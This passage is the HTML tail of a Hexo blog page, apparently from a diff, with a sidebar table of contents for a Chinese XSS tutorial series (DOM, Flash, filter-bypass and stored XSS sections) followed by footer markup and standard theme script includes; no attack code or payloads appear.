nav-level-2"><a class="nav-link" href="#13-Dom-Xss实例-Discuz-X2-5"><span class="nav-number">2.6.</span> <span class="nav-text">13. Dom Xss实例 [Discuz X2.5]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flash-XSS"><span class="nav-number">3.</span> <span class="nav-text">Flash XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#14-Flash-Xss入门-navigateToURL"><span class="nav-number">3.1.</span> <span class="nav-text">14. Flash Xss入门 [navigateToURL]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-Flash-Xss进阶-ExternalInterface-call第一个参数"><span class="nav-number">3.2.</span> <span class="nav-text">15. Flash Xss进阶 [ExternalInterface.call第一个参数]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先从程序员的角度说下基础知识"><span class="nav-number">3.2.1.</span> <span class="nav-text">先从程序员的角度说下基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例"><span class="nav-number">3.2.2.</span> <span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-Flash-Xss进阶-ExternalInterface-call第二个参数"><span class="nav-number">3.3.</span> <span class="nav-text">16. Flash Xss进阶 [ExternalInterface.call第二个参数]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-Filter-Bypass"><span class="nav-number">4.</span> <span class="nav-text">XSS Filter Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#17-XSS过滤器绕过-通用绕过"><span class="nav-number">4.1.</span> <span class="nav-text">17. XSS过滤器绕过 [通用绕过]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-XSS过滤器绕过-猥琐绕过"><span class="nav-number">4.2.</span> <span class="nav-text">18. XSS过滤器绕过 [猥琐绕过]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#存储型XSS"><span class="nav-number">5.</span> <span class="nav-text">存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#19-存储型XSS入门-什么都没过滤的情况"><span class="nav-number">5.1.</span> <span class="nav-text">19. 存储型XSS入门 [什么都没过滤的情况]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-存储型XSS入门-套现绕过富文本"><span class="nav-number">5.2.</span> <span class="nav-text">20. 存储型XSS入门 [套现绕过富文本]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS"><span class="nav-number">5.3.</span> <span class="nav-text">21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cytosine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
